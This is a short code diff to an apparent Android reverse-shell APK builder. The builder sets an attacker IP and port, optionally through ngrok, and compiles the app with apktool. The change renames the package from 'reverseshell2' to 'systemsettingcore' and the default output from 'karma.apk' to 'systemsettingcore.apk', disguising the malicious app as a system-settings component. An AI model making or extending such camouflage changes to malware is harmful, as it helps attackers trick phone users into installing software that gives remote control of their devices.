@@ -354,7 +354,7 @@ def connection_checker(socket,queue):
 
 
 def build(ip,port,output,ngrok=False,ng=None,icon=None):
-    editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
+    editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"app"+direc+"systemsettingcore"+direc+"config.smali"
     try:
         file = open(editor,"r").readlines()
         #Very much uncertaninity but cant think any other way to do it xD
@@ -371,7 +371,7 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     #version_no = re.search(pattern, java_version.stderr).groups()[0]
     # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
     print(stdOutput("info")+"\033[0mGenerating APK")
-    outFileName = output if output else "karma.apk"
+    outFileName = output if output else "systemsettingcore.apk"
     que = queue.Queue()
     t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
     t.start()
